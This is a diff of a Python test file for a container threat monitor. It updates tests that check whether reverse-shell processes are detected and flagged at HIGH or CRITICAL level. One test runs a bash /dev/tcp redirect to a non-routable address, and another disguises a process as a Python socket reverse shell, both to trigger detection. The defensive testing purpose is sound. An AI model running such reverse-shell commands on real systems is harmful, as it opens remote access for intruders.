@@ -4256,12 +4256,15 @@ class TestProcessHostProcWalk:
     def test_reverse_shell_detected_via_host_proc_walk(
         self, test_workspace, enable_monitoring, coi_binary
     ):
-        """A reverse-shell process in the container must trigger a CRITICAL.
+        """A reverse-shell process in the container must trigger a HIGH or CRITICAL threat.
 
         The process is injected with exec -a to make its argv[0] look like
         'python -c socket.socket'. The host /proc walk reads cmdline from
         outside the container's mount namespace, so the pattern is visible
         regardless of what /proc looks like inside the container.
+
+        ProcEventWatcher may fire a HIGH threat immediately via PROC_EVENT_EXEC
+        before the polling detector has a chance to escalate to CRITICAL.
         """
         container_name = (
             get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-57"
@@ -4307,11 +4310,15 @@ class TestProcessHostProcWalk:
                     killed = True
                     break
 
-            assert killed, "Container should be killed on CRITICAL reverse-shell via host proc walk"
+            assert killed, (
+                "Container should be paused/killed on reverse-shell detection via host proc walk"
+            )
 
             events = get_threat_events(container_name)
-            critical = [e for e in events if e.get("level") == "critical"]
-            assert len(critical) > 0, "Expected CRITICAL threat event for reverse-shell pattern"
+            high_or_critical = [e for e in events if e.get("level") in ("high", "critical")]
+            assert len(high_or_critical) > 0, (
+                "Expected HIGH or CRITICAL threat event for reverse-shell pattern"
+            )
         finally:
             proc.terminate()
             cleanup_container(container_name, coi_binary)
@@ -4856,8 +4863,14 @@ process_spawn_rate_threshold = 9999
 class TestProcEventWatcher:
     """End-to-end tests for host-side PROC_EVENTS monitoring via NETLINK_CONNECTOR."""
 
-    def test_bash_interactive_exec_detected(self, test_workspace, coi_binary):
-        """Executing 'bash -i' inside a container triggers a HIGH proc_event threat."""
+    def test_bash_tcp_redirect_exec_detected(self, test_workspace, coi_binary):
+        """Executing 'bash -c /dev/tcp/...' inside a container triggers a HIGH proc_event threat.
+
+        The bash-tcp-redirect pattern matches when bash itself (argv[0]) opens a
+        /dev/tcp/ redirect — a canonical reverse-shell one-liner technique.
+        bash -i alone is intentionally NOT detected to avoid false positives from
+        legitimate interactive shells started by the host tooling.
+        """
         config_path = Path.home() / ".coi" / "config.toml"
         backup = config_path.read_text() if config_path.exists() else None
 
@@ -4904,8 +4917,9 @@ process_spawn_rate_threshold = 9999
             # Allow monitoring daemon and PROC_EVENTS subscription to initialise.
             time.sleep(3)
 
-            # Run a command that matches the "bash-interactive" pattern.
-            # PROC_EVENT_EXEC fires when execve is called inside the container.
+            # Run bash with a /dev/tcp/ redirect — the canonical bash reverse-shell
+            # pattern. The connection to 10.255.255.1:9999 will fail (no listener),
+            # but PROC_EVENT_EXEC fires on execve before the shell tries to connect.
             subprocess.Popen(
                 [
                     "incus",
@@ -4913,13 +4927,12 @@ process_spawn_rate_threshold = 9999
                     container_name,
                     "--",
                     "bash",
-                    "-i",
                     "-c",
-                    "exit 0",
+                    "bash -c 'exec 3>/dev/tcp/10.255.255.1/9999' 2>/dev/null; true",
                 ],
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL,
-            ).wait(timeout=10)
+            ).wait(timeout=15)
 
             # Poll until the proc_event threat appears (30 s timeout).
             proc_events = []
@@ -4931,14 +4944,14 @@ process_spawn_rate_threshold = 9999
                     for e in events
                     if e.get("category") == "proc_event"
                     and e.get("evidence", {}).get("proc_event", {}).get("pattern")
-                    == "bash-interactive"
+                    == "bash-tcp-redirect"
                 ]
                 if proc_events:
                     break
                 time.sleep(1)
 
             assert len(proc_events) > 0, (
-                f"Expected proc_event threat for bash -i, got events: {events}"
+                f"Expected proc_event threat for bash /dev/tcp redirect, got events: {events}"
             )
             assert proc_events[0].get("level") == "high", (
                 f"Expected high level, got: {proc_events[0].get('level')}"
